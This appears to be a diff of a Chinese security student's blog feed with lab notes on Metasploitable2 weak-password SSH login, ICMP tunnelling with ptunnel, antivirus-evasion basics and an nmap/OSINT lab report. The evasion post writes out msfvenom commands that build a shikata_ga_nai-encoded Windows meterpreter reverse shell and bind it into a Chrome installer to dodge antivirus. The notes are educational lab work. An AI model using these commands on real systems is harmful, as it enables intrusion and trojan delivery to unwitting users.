@@ -106,7 +106,7 @@
 <h3 id="22端口攻击"><a href="#22端口攻击" class="headerlink" title="22端口攻击"></a>22端口攻击</h3><blockquote>
 <p>nmap下sV扫描版本信息为  OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)，msf直接搜索漏洞未果，那么有可能像ftp匿名登录或者弱口令，利用hydra直接爆破</p>
 <p>hydra 192.168.206.216 -L user字典 -P  passwd字典 -u IP ssh,由于没得字典，所以利用了其他工具得到账户msfdamin&#x2F;msfadmin ,但是没想到还扫出来多个弱口令，比如ftp的匿名登录</p>
-<p>kali下登录ssh <a href="mailto:&#x6d;&#115;&#102;&#x61;&#100;&#x6d;&#x69;&#x6e;&#x40;&#x31;&#57;&#50;&#46;&#x31;&#x36;&#x38;&#x2e;&#x38;&#48;&#x2e;&#x31;&#x32;&#57;">&#x6d;&#115;&#102;&#x61;&#100;&#x6d;&#x69;&#x6e;&#x40;&#x31;&#57;&#50;&#46;&#x31;&#x36;&#x38;&#x2e;&#x38;&#48;&#x2e;&#x31;&#x32;&#57;</a> 连接成功后拿到shell,但不是root权限，后续步骤或拿去权限（其实sudo -i可root账户）</p>
+<p>kali下登录ssh <a href="mailto:&#x6d;&#115;&#102;&#x61;&#100;&#x6d;&#105;&#110;&#64;&#49;&#57;&#50;&#46;&#49;&#x36;&#x38;&#x2e;&#56;&#x30;&#x2e;&#49;&#50;&#57;">&#x6d;&#115;&#102;&#x61;&#100;&#x6d;&#105;&#110;&#64;&#49;&#57;&#50;&#46;&#49;&#x36;&#x38;&#x2e;&#56;&#x30;&#x2e;&#49;&#50;&#57;</a> 连接成功后拿到shell,但不是root权限，后续步骤或拿去权限（其实sudo -i可root账户）</p>
 </blockquote>
 <p><img src="/2023/11/04/Metasploitable2%E9%9D%B6%E6%9C%BA%E6%9C%AC%E5%9C%B0%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/7.png" alt="7"></p>
 <h3 id="23端口攻击"><a href="#23端口攻击" class="headerlink" title="23端口攻击"></a>23端口攻击</h3><blockquote>
@@ -159,6 +159,41 @@
       </categories>
       <tags>
         <tag>CVE,靶机,Metasploitable2</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ping-ptunnel与icmp隧道绕过</title>
+    <url>/2023/12/14/pingtunnel%E4%B8%8Eicmp%E9%9A%A7%E9%81%93%E7%BB%95%E8%BF%87/</url>
+    <content><![CDATA[<hr>
+<p>填坑，之前frp和socks隧道代理后，proxychain4 ping无法返回包，此次学习了pingtunnel与icmp隧道绕过</p>
+<hr>
+<h4 id="网络拓扑图如下"><a href="#网络拓扑图如下" class="headerlink" title="网络拓扑图如下"></a>网络拓扑图如下</h4><p><img src="/pingtunnel%E4%B8%8Eicmp%E9%9A%A7%E9%81%93%E7%BB%95%E8%BF%87/11-17022646760041.jpg"></p>
+<h4 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h4><h5 id="icmp协议"><a href="#icmp协议" class="headerlink" title="icmp协议"></a>icmp协议</h5><p>ICMP（Internet Control Message Protocol）Internet控制<a href="https://baike.baidu.com/item/%E6%8A%A5%E6%96%87/3164352?fromModule=lemma_inlink">报文</a>协议。它是<a href="https://baike.baidu.com/item/TCP/IP/214077?fromModule=lemma_inlink">TCP&#x2F;IP</a>协议簇的一个子协议，用于在IP<a href="https://baike.baidu.com/item/%E4%B8%BB%E6%9C%BA/455151?fromModule=lemma_inlink">主机</a>、<a href="https://baike.baidu.com/item/%E8%B7%AF%E7%94%B1%E5%99%A8/108294?fromModule=lemma_inlink">路由器</a>之间传递控制消息。控制消息是指网络通不通、<a href="https://baike.baidu.com/item/%E4%B8%BB%E6%9C%BA/455151?fromModule=lemma_inlink">主机</a>是否可达、<a href="https://baike.baidu.com/item/%E8%B7%AF%E7%94%B1/363497?fromModule=lemma_inlink">路由</a>是否可用等网络本身的消息。这些控制消息虽然并不传输用户数据，但是对于用户数据的传递起着重要的作用 （百度百科）</p>
+<h4 id="icmp隧道"><a href="#icmp隧道" class="headerlink" title="icmp隧道"></a>icmp隧道</h4><p>在实际的后渗透阶段：因为防火墙（大多不止一个）存在，未必开启了可以使用的端口（有时是因为要到的shell权限过低等无权操作防火墙）进行利用。那么可以利用icmp隧道建立联系。因为icmp协议工作在网络层，依附于IP工作，（像上一篇文章的坑：ping无数据包返回）。</p>
+<p>因此，我们可以包tcp&#x2F;unp数据包封装到icmp协议中（还在学习中，解释如下）：</p>
+<blockquote>
+<p><strong>请求端的 Ping 工具通常会在 ICMP 数据包后面附加上一段随机的数据作为 Payload，而响应端则会拷贝这段 Payload 到 ICMP 响应数据包中返还给请求端，用于识别和匹配 Ping 请求。</strong> </p>
+<p><strong>Windows 和 Linux 系统下的 Ping 工具默认的 Payload 长度为 64 比特，但实际上协议允许附加最大 64K 大小的 Payload。 对于隧道数据，icmptunnel 首先会指定客户端和服务器端。随后，客户端会将 IP 帧封装在 ICMP 请求数据包中发送给服务器，而服务器端则会使用相匹配的 ICMP 响应数据包进行回复。这样在旁人看来，网络中传播的仅仅只是正常的 ICMP 数据包。</strong> 																																解释内容参考：先知社区《内网渗透之icmp隐藏隧道》</p>
+</blockquote>
+<h4 id="ptunnel工具"><a href="#ptunnel工具" class="headerlink" title="ptunnel工具"></a>ptunnel工具</h4><p>ptunnel是一款建立ICMP隧道传输数据的工具。</p>
+<p>命令释义：</p>
+<ul>
+<li><p>参数-p：指定代理服务器，即此示例中的代理服务器B（192.168.1.2）</p>
+</li>
+<li><p>参数-lp：指定本地监听端口</p>
+</li>
+<li><p>参数-da：指定欲访问的目标服务器</p>
+</li>
+<li><p>参数-dp：指定欲访问的目标端口</p>
+<p>待更新。。。。</p>
+</li>
+</ul>
+<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
+      <categories>
+        <category>内网穿透</category>
+      </categories>
+      <tags>
+        <tag>渗透测试，icmp协议</tag>
       </tags>
   </entry>
   <entry>
@@ -221,38 +256,96 @@
       </tags>
   </entry>
   <entry>
-    <title>pingtunnel与icmp隧道绕过</title>
-    <url>/2023/12/14/pingtunnel%E4%B8%8Eicmp%E9%9A%A7%E9%81%93%E7%BB%95%E8%BF%87/</url>
+    <title>免杀基础了解笔记</title>
+    <url>/2023/12/15/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E4%BA%86%E8%A7%A3%E7%AC%94%E8%AE%B0/</url>
     <content><![CDATA[<hr>
-<p>填坑，之前frp和socks隧道代理后，proxychain4 ping无法返回包，此次学习了pingtunnel与icmp隧道绕过</p>
+<p> 免杀基础笔记</p>
 <hr>
-<h4 id="网络拓扑图如下"><a href="#网络拓扑图如下" class="headerlink" title="网络拓扑图如下"></a>网络拓扑图如下</h4><p><img src="/pingtunnel%E4%B8%8Eicmp%E9%9A%A7%E9%81%93%E7%BB%95%E8%BF%87/11-17022646760041.jpg"></p>
-<h4 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h4><h5 id="icmp协议"><a href="#icmp协议" class="headerlink" title="icmp协议"></a>icmp协议</h5><p>ICMP（Internet Control Message Protocol）Internet控制<a href="https://baike.baidu.com/item/%E6%8A%A5%E6%96%87/3164352?fromModule=lemma_inlink">报文</a>协议。它是<a href="https://baike.baidu.com/item/TCP/IP/214077?fromModule=lemma_inlink">TCP&#x2F;IP</a>协议簇的一个子协议，用于在IP<a href="https://baike.baidu.com/item/%E4%B8%BB%E6%9C%BA/455151?fromModule=lemma_inlink">主机</a>、<a href="https://baike.baidu.com/item/%E8%B7%AF%E7%94%B1%E5%99%A8/108294?fromModule=lemma_inlink">路由器</a>之间传递控制消息。控制消息是指网络通不通、<a href="https://baike.baidu.com/item/%E4%B8%BB%E6%9C%BA/455151?fromModule=lemma_inlink">主机</a>是否可达、<a href="https://baike.baidu.com/item/%E8%B7%AF%E7%94%B1/363497?fromModule=lemma_inlink">路由</a>是否可用等网络本身的消息。这些控制消息虽然并不传输用户数据，但是对于用户数据的传递起着重要的作用 （百度百科）</p>
-<h4 id="icmp隧道"><a href="#icmp隧道" class="headerlink" title="icmp隧道"></a>icmp隧道</h4><p>在实际的后渗透阶段：因为防火墙（大多不止一个）存在，未必开启了可以使用的端口（有时是因为要到的shell权限过低等无权操作防火墙）进行利用。那么可以利用icmp隧道建立联系。因为icmp协议工作在网络层，依附于IP工作，（像上一篇文章的坑：ping无数据包返回）。</p>
-<p>因此，我们可以包tcp&#x2F;unp数据包封装到icmp协议中（还在学习中，解释如下）：</p>
-<blockquote>
-<p><strong>请求端的 Ping 工具通常会在 ICMP 数据包后面附加上一段随机的数据作为 Payload，而响应端则会拷贝这段 Payload 到 ICMP 响应数据包中返还给请求端，用于识别和匹配 Ping 请求。</strong> </p>
-<p><strong>Windows 和 Linux 系统下的 Ping 工具默认的 Payload 长度为 64 比特，但实际上协议允许附加最大 64K 大小的 Payload。 对于隧道数据，icmptunnel 首先会指定客户端和服务器端。随后，客户端会将 IP 帧封装在 ICMP 请求数据包中发送给服务器，而服务器端则会使用相匹配的 ICMP 响应数据包进行回复。这样在旁人看来，网络中传播的仅仅只是正常的 ICMP 数据包。</strong> 																																解释内容参考：先知社区《内网渗透之icmp隐藏隧道》</p>
-</blockquote>
-<h4 id="ptunnel工具"><a href="#ptunnel工具" class="headerlink" title="ptunnel工具"></a>ptunnel工具</h4><p>ptunnel是一款建立ICMP隧道传输数据的工具。</p>
-<p>命令释义：</p>
-<ul>
-<li><p>参数-p：指定代理服务器，即此示例中的代理服务器B（192.168.1.2）</p>
+<h3 id="免杀基础概念"><a href="#免杀基础概念" class="headerlink" title="免杀基础概念"></a>免杀基础概念</h3><p>免杀一般指反病毒技术，在一些特定情况下或者实际场景下获得目标靶机后，因存在杀毒软件的检测，所以很多脚本等都无法使用，这是需要一种木马或脚本免于被杀毒软件查杀的技术。</p>
+<p>免杀涉及到的内容比较多，基本的免杀多是修改木马内容，改变其特征码，捆绑，加壳，分离等。</p>
+<p>免杀感觉更偏向于逆写和二进制（不是全部），对于web安全入门，多使用msf和cs进行免杀测试，之后能力提升后，可以自己编写免杀脚本。</p>
+<h3 id="杀毒软件检测方式"><a href="#杀毒软件检测方式" class="headerlink" title="杀毒软件检测方式"></a>杀毒软件检测方式</h3><h4 id="静态查杀"><a href="#静态查杀" class="headerlink" title="静态查杀"></a>静态查杀</h4><p>一般根据特征码识别，对文件进行特征码匹配。将扫描信息与病毒数据库进行对照，如果信息与其中的任何一个病毒特征符合，杀毒软件就会判断此文件被病毒感染。杀毒软件在进行查杀的时候，会挑选文件内部的一段或者几段代码来作为他识别病毒的方式，这种代码就叫做病毒的特征码；在病毒样本中，抽取特征代码；抽取的代码比较特殊，不大可能与普通正常程序代码吻合；抽取的代码要有适当长度，一方面维持特征代码的唯一性，另一方面保证病毒扫描时候不要有太大的空间与时间的开销。</p>
+<h4 id="云查杀"><a href="#云查杀" class="headerlink" title="云查杀"></a>云查杀</h4><p>查杀原理是对文件内容和行为的检测</p>
+<h4 id="行为查杀-动态查杀"><a href="#行为查杀-动态查杀" class="headerlink" title="行为查杀&#x2F;动态查杀"></a>行为查杀&#x2F;动态查杀</h4><p>对目标产生的行为进行检测，即对即将执行的指令进行检测</p>
+<h4 id="扫描查杀方式"><a href="#扫描查杀方式" class="headerlink" title="扫描查杀方式"></a>扫描查杀方式</h4><ul>
+<li><p>1、扫描压缩包技术：即是对压缩包案和封装文件作分析检查的技术。</p>
 </li>
-<li><p>参数-lp：指定本地监听端口</p>
+<li><p>2、程序窜改防护：即是避免恶意程序借由删除杀毒侦测程序而大肆破坏电脑。</p>
 </li>
-<li><p>参数-da：指定欲访问的目标服务器</p>
+<li><p>3、修复技术：即是对恶意程序所损坏的文件进行还原</p>
 </li>
-<li><p>参数-dp：指定欲访问的目标端口</p>
-<p>待更新。。。。</p>
+<li><p>4、急救盘杀毒：利用空白U盘制作急救启动盘，来检测电脑病毒。</p>
+</li>
+<li><p>5、智能扫描：扫描最常用的磁盘，系统关键位置，耗时较短。</p>
+</li>
+<li><p>6、全盘扫描：扫描电脑全部磁盘，耗时较长。</p>
+</li>
+<li><p>7、勒索软件防护：保护电脑中的文件不被黑客恶意加密。</p>
+</li>
+<li><p>8、开机扫描：当电脑开机时自动进行扫描，可以扫描压缩文档和可能不需要的程序</p>
+<h4 id="监控技术"><a href="#监控技术" class="headerlink" title="监控技术"></a>监控技术</h4></li>
+<li><p>内存监控：当内存中注入病毒时，进行删除等操作</p>
+</li>
+<li><p>文件监控：当文件被越权改动，或写入磁盘时存在病毒时进行查杀</p>
+</li>
+<li><p>网页保护：阻止非法网站的窃取和非法文件下载</p>
+<p><strong>其他的还有主动防御技术，机器学习识别技术(人工智能识别技术)，进程行为检测法()沙盒模式，文件校验法等等</strong></p>
+<h3 id="基础免杀于msfvenom工具"><a href="#基础免杀于msfvenom工具" class="headerlink" title="基础免杀于msfvenom工具"></a>基础免杀于msfvenom工具</h3><p>简单免杀多是改变进程名称，图标，文件名称，文件属性，加壳，对木马进行编码，修改源码的特征码，对shellcode进行二次编译，使用免杀生成器，加载器等。</p>
 </li>
 </ul>
+<p>msFvenom是msfpayload和msfencode的组合，msFvenom目前已经无法单独使用绕过免杀。</p>
+<ul>
+<li><p>-p 指定使用的payload</p>
+</li>
+<li><p>-l 列出指定模块的可用资源：payloads encodes nops all</p>
+</li>
+<li><p>-n 为payload预定一个NOP的滑动长度</p>
+</li>
+<li><p>-f 指定输出格式</p>
+</li>
+<li><p>-e 指定需要的编码格式</p>
+</li>
+<li><p>-a 指定payload的目标架构 x86|x64|x86_64</p>
+</li>
+<li><p>-platform 指定目标平台</p>
+</li>
+<li><p>-s 设置文件大小</p>
+</li>
+<li><p>-i 设置编码次数</p>
+</li>
+<li><p>-o 指定payload存放位置</p>
+<h4 id="简单使用"><a href="#简单使用" class="headerlink" title="简单使用"></a>简单使用</h4></li>
+</ul>
+<p>kali下执行</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">msfvenom -a x86 -p windows/meterpreter/reverse_tcp  LHOST=192.168.56.128 LPORT=7777 -e x86/shikata_ga_nai -i 30 -b &#x27;\x00&#x27; -f exe -o shell.exe<br></code></pre></td></tr></table></figure>
+
+<p>  该命令是指制作一个windows x86架构的反向shell，其中设置监听主机为ip和port，编码格式下为</p>
+<p><strong>shikat_ga_nai</strong> (不包含\x00字符即空字符)(此处编码了30次)的名为shell.exe的可执行脚本。</p>
+<p><img src="/2023/12/15/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E4%BA%86%E8%A7%A3%E7%AC%94%E8%AE%B0/QQ%E6%88%AA%E5%9B%BE20231215124624.jpg" alt="木马生成"></p>
+<p>放到&#x2F;上传到指定系统双击运行即可。(因为安装的360杀毒很久之前就已经可以检测出来了，就不展示了^<del>__</del>^</p>
+<p><img src="/2023/12/15/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E4%BA%86%E8%A7%A3%E7%AC%94%E8%AE%B0/QQ%E6%88%AA%E5%9B%BE20231215135040.jpg" alt="木马被360拦截"></p>
+<p>msfvenom进行捆绑软件木马</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">msfvenom -a x86 -p windows/meterpreter/reverse_tcp  LHOST=192.168.65.128 LPORT=7777 -e x86/shikata_ga_nai -i 30 -b &#x27;\x00&#x27; -x setchrome.exe -f exe -o shell.exe<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>图中ip的65写成了56，唉又重新做了一遍，哭。</li>
+</ul>
+<p><img src="/2023/12/15/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E4%BA%86%E8%A7%A3%E7%AC%94%E8%AE%B0/QQ%E6%88%AA%E5%9B%BE20231215140146.jpg" alt="捆绑安装chrome"></p>
+<p>发现360杀毒并未检测出来病毒（360杀毒安装时间为23-12-15日，但过了大约1分钟后被查杀出）（但第二次上传后，未进行扫描，且断开网络后360并未查杀，（个人猜测：感觉是本地库下扫描未检出，但联网后的云检测可以检测出来（个人猜想不一定正确^__^））</p>
+<p><img src="/2023/12/15/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E4%BA%86%E8%A7%A3%E7%AC%94%E8%AE%B0/QQ%E6%88%AA%E5%9B%BE20231215140722.jpg"></p>
+<p>下一步开始执行安装程序（下载kali开启监听</p>
+<p>操作时突然发现一个盲点：kali目前只有一个网卡，windows10有两个，但要互ping就要使用VM8网卡，而这个网卡又连着网络，一连网就查杀。无奈再给kali一个网卡vm2，重新走一遍流程。哭，kali默认的atuo lo就只有一个网卡，还得重新静态路由。！！！</p>
+<p><img src="/2023/12/15/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E4%BA%86%E8%A7%A3%E7%AC%94%E8%AE%B0/QQ%E6%88%AA%E5%9B%BE20231215143025.jpg"></p>
+<p><img src="/2023/12/15/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E4%BA%86%E8%A7%A3%E7%AC%94%E8%AE%B0/QQ%E6%88%AA%E5%9B%BE20231215144014.jpg"></p>
+<p>重来：</p>
+<p>重新生成-&gt;window10禁止上网-&gt;打开360-&gt;木马查杀-&gt;kali msf监听-&gt;双击运行（对，这一切的一切windows10没开windows defender。）</p>
+<p>额返回值还是为空？？？</p>
 <link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
       <categories>
-        <category>内网穿透</category>
+        <category>免杀</category>
       </categories>
       <tags>
-        <tag>渗透测试，icmp协议</tag>
+        <tag>渗透测试，免杀</tag>
       </tags>
   </entry>
   <entry>
@@ -294,6 +387,99 @@
       </categories>
       <tags>
         <tag>php代码分析，webmin</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>实验课一</title>
+    <url>/2023/12/07/%E5%AE%9E%E9%AA%8C%E4%B8%80%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F/</url>
+    <content><![CDATA[<p><strong>网络渗透测试实验报告</strong> </p>
+<hr>
+<h2 id="一-实验目的和要求"><a href="#一-实验目的和要求" class="headerlink" title="一 实验目的和要求"></a>一 实验目的和要求</h2><p>理解网络扫描、网络侦察的作用；通过搭建网络渗透测试平台，了解并熟悉常用搜索引擎、扫描工具的应用，通过信息收集为下一步渗透工作打下基础。</p>
+<h2 id="二-实验步骤"><a href="#二-实验步骤" class="headerlink" title="二 实验步骤"></a>二 实验步骤</h2><h3 id="1-用搜索引擎Google或百度搜索麻省理工学院网站中文件名包含“network-security”的pdf文档，截图搜索得到的页面。"><a href="#1-用搜索引擎Google或百度搜索麻省理工学院网站中文件名包含“network-security”的pdf文档，截图搜索得到的页面。" class="headerlink" title="1.用搜索引擎Google或百度搜索麻省理工学院网站中文件名包含“network security”的pdf文档，截图搜索得到的页面。"></a>1.用搜索引擎Google或百度搜索麻省理工学院网站中文件名包含“network security”的pdf文档，截图搜索得到的页面。</h3><p>使用Google搜索：</p>
+<p><img src="/2023/12/07/%E5%AE%9E%E9%AA%8C%E4%B8%80%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F/image-20231209195152905.png" alt="image-20231209195152905"></p>
+<p>查找相关网页：</p>
+<p><img src="/2023/12/07/%E5%AE%9E%E9%AA%8C%E4%B8%80%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F/image-20231209195206871.png" alt="image-20231209195206871"></p>
+<p><img src="/2023/12/07/%E5%AE%9E%E9%AA%8C%E4%B8%80%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F/image-20231209195211299.png" alt="image-20231209195211299"></p>
+<h3 id="2-照片中的女生在哪里旅行？截图搜索到的地址信息。"><a href="#2-照片中的女生在哪里旅行？截图搜索到的地址信息。" class="headerlink" title="2.照片中的女生在哪里旅行？截图搜索到的地址信息。"></a>2.照片中的女生在哪里旅行？截图搜索到的地址信息。</h3><p><img src="/2023/12/07/%E5%AE%9E%E9%AA%8C%E4%B8%80%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F/image-20231209195232804.png" alt="image-20231209195232804"></p>
+<p>Google搜索：letrentehuit café brasserie发现：</p>
+<p><img src="/2023/12/07/%E5%AE%9E%E9%AA%8C%E4%B8%80%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F/image-20231209195249443.png" alt="image-20231209195249443"></p>
+<p>地址是：38 avenue de Suffren.75015 Paris.France。</p>
+<h3 id="3-手机位置定位。通过LAC（Location-Area-Code，位置区域码）和CID（Cell-Identity，基站编号，是个16位的数据（范围是0到65535）可以查询手机接入的基站的位置，从而初步确定手机用户的位置。"><a href="#3-手机位置定位。通过LAC（Location-Area-Code，位置区域码）和CID（Cell-Identity，基站编号，是个16位的数据（范围是0到65535）可以查询手机接入的基站的位置，从而初步确定手机用户的位置。" class="headerlink" title="3.手机位置定位。通过LAC（Location Area Code，位置区域码）和CID（Cell Identity，基站编号，是个16位的数据（范围是0到65535）可以查询手机接入的基站的位置，从而初步确定手机用户的位置。"></a>3.手机位置定位。通过LAC（Location Area Code，位置区域码）和CID（Cell Identity，基站编号，是个16位的数据（范围是0到65535）可以查询手机接入的基站的位置，从而初步确定手机用户的位置。</h3><p>华为手机应该拨号*#* #2846579# *#*进入工程模式</p>
+<p><img src="/2023/12/07/%E5%AE%9E%E9%AA%8C%E4%B8%80%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F/image-20231209195332722.png" alt="image-20231209195332722"></p>
+<p>但是honor系列并不能在工程菜单找到相关信息。</p>
+<img src="11-17021235157051.png" style="zoom:50%;" />
+
+<p>在基站查询工具得到如下信息：</p>
+<img src="qq_pic_merged_1702124303982.jpg" alt="qq_pic_merged_1702124303982" style="zoom:50%;" />
+
+
+
+<h3 id="4-编码解码将Z29vZCBnb29kIHN0dWR5IQ-解码。截图。"><a href="#4-编码解码将Z29vZCBnb29kIHN0dWR5IQ-解码。截图。" class="headerlink" title="4.编码解码将Z29vZCBnb29kIHN0dWR5IQ&#x3D;&#x3D;解码。截图。"></a>4.编码解码将Z29vZCBnb29kIHN0dWR5IQ&#x3D;&#x3D;解码。截图。</h3><p><img src="/2023/12/07/%E5%AE%9E%E9%AA%8C%E4%B8%80%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F/image-20231209195413526.png" alt="image-20231209195413526"></p>
+<h3 id="5-地址信息"><a href="#5-地址信息" class="headerlink" title="5.地址信息"></a>5.地址信息</h3><h4 id="5-1内网中捕获到一个以太帧，源MAC地址为：98-CA-33-02-27-B5；目的IP地址为：202-193-64-34，回答问题：该用户使用的什么品牌的设备，访问的是什么网站？并附截图。"><a href="#5-1内网中捕获到一个以太帧，源MAC地址为：98-CA-33-02-27-B5；目的IP地址为：202-193-64-34，回答问题：该用户使用的什么品牌的设备，访问的是什么网站？并附截图。" class="headerlink" title="5.1内网中捕获到一个以太帧，源MAC地址为：98-CA-33-02-27-B5；目的IP地址为：202.193.64.34，回答问题：该用户使用的什么品牌的设备，访问的是什么网站？并附截图。"></a>5.1内网中捕获到一个以太帧，源MAC地址为：98-CA-33-02-27-B5；目的IP地址为：202.193.64.34，回答问题：该用户使用的什么品牌的设备，访问的是什么网站？并附截图。</h4><p><img src="/2023/12/07/%E5%AE%9E%E9%AA%8C%E4%B8%80%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F/image-20231209195442914.png" alt="image-20231209195442914"></p>
+<p><img src="/2023/12/07/%E5%AE%9E%E9%AA%8C%E4%B8%80%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F/image-20231209195447579.png" alt="image-20231209195447579"></p>
+<p><img src="/2023/12/07/%E5%AE%9E%E9%AA%8C%E4%B8%80%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F/image-20231209195450786.png" alt="image-20231209195450786"></p>
+<p>该用户使用的apple品牌的的设备，访问的是广西桂林市教育网桂林电子科技大学网站。</p>
+<h4 id="5-2访问https-whatismyipaddress-com得到MyIP信息，利用ipconfig-Windows-或ifconfig-Linux-查看本机IP地址，两者值相同吗？如果不相同的话，说明原因。"><a href="#5-2访问https-whatismyipaddress-com得到MyIP信息，利用ipconfig-Windows-或ifconfig-Linux-查看本机IP地址，两者值相同吗？如果不相同的话，说明原因。" class="headerlink" title="5.2访问https://whatismyipaddress.com得到MyIP信息，利用ipconfig(Windows)或ifconfig(Linux)查看本机IP地址，两者值相同吗？如果不相同的话，说明原因。"></a>5.2访问<a href="https://whatismyipaddress.com得到MyIP信息，利用ipconfig(Windows)或ifconfig(Linux)查看本机IP地址，两者值相同吗？如果不相同的话，说明原因。">https://whatismyipaddress.com得到MyIP信息，利用ipconfig(Windows)或ifconfig(Linux)查看本机IP地址，两者值相同吗？如果不相同的话，说明原因。</a></h4><p><img src="/2023/12/07/%E5%AE%9E%E9%AA%8C%E4%B8%80%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F/image-20231209195521692.png" alt="image-20231209195521692"></p>
+<p>可以发现两个值并不一样，cmd下查询的IP是局域网内的私有IP，网站查询的为为公网IP，是当前网络连接的出口IP。但此处公网IP为US归属，是因为接入了VPN使用。</p>
+<p>这里涉及到的知识点是：可以通过NAT实现从私网IP到公网IP之间的联系。在报文离开私网进入Internet时，将源IP替换为公网地址，通常是出口设备的接口地址；一个对外的访问请求在到达目标以后，表现为由本组织出口设备发起，因此被请求的服务端可将响应由Internet发回出口网关；</p>
+<p>出口网关再将目的地址替换为私网的源主机地址，发回内部。</p>
+<h3 id="6-NMAP使用"><a href="#6-NMAP使用" class="headerlink" title="6.NMAP使用"></a>6.NMAP使用</h3><h4 id="6-1利用NMAP扫描Metasploitable2（需下载虚拟机镜像）的端口开放情况。并附截图。说明其中四个端口的提供的服务，查阅资料，简要说明该服务的功能。"><a href="#6-1利用NMAP扫描Metasploitable2（需下载虚拟机镜像）的端口开放情况。并附截图。说明其中四个端口的提供的服务，查阅资料，简要说明该服务的功能。" class="headerlink" title="6.1利用NMAP扫描Metasploitable2（需下载虚拟机镜像）的端口开放情况。并附截图。说明其中四个端口的提供的服务，查阅资料，简要说明该服务的功能。"></a>6.1利用NMAP扫描Metasploitable2（需下载虚拟机镜像）的端口开放情况。并附截图。说明其中四个端口的提供的服务，查阅资料，简要说明该服务的功能。</h4><p><img src="/2023/12/07/%E5%AE%9E%E9%AA%8C%E4%B8%80%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F/image-20231209195601791.png" alt="image-20231209195601791"></p>
+<p>端口21的ftp（文件传输协议）服务，用于文件传输使用，是一种基于TCP的协议，采用客户&#x2F;服务器模式。通过FTP协议，用户可以在FTP服务器中进行文件的上传或下载等操作。（部分情况下可匿名登录</p>
+<p>端口22的ssh服务：用于远程登录管理计算机或服务器等，专为远程登陆会话和其他网络服务提供的安全性协议。利用SSH协议可以有效的防止远程管理过程中的信息泄漏问题。</p>
+<p>端口3306的mysql服务，mysql数据库用于管理网站等用户数据和信息。开放3306端口，可以远程登录并管理mysql服务。远程登录的话漏洞大多为弱口令，然后数据库写马。各个数据库端口开放不同。</p>
+<p>端口80的http服务，这里的端口开放表示靶机有基于apache&#x2F;nhinx等的网站开放。</p>
+<h4 id="6-2利用NMAP扫描Metasploitable2的操作系统类型，并附截图。"><a href="#6-2利用NMAP扫描Metasploitable2的操作系统类型，并附截图。" class="headerlink" title="6.2利用NMAP扫描Metasploitable2的操作系统类型，并附截图。"></a>6.2利用NMAP扫描Metasploitable2的操作系统类型，并附截图。</h4><p><img src="/2023/12/07/%E5%AE%9E%E9%AA%8C%E4%B8%80%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F/image-20231209195637125.png" alt="image-20231209195637125"></p>
+<p>OS类型为liunx系统，版本范围为；2.6.9-2.6.33</p>
+<h4 id="6-3利用NMAP穷举-Metasploitable2上dvwa的登录账号和密码。"><a href="#6-3利用NMAP穷举-Metasploitable2上dvwa的登录账号和密码。" class="headerlink" title="6.3利用NMAP穷举 Metasploitable2上dvwa的登录账号和密码。"></a>6.3利用NMAP穷举 Metasploitable2上dvwa的登录账号和密码。</h4><p><img src="/2023/12/07/%E5%AE%9E%E9%AA%8C%E4%B8%80%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F/image-20231209195657193.png" alt="image-20231209195657193"></p>
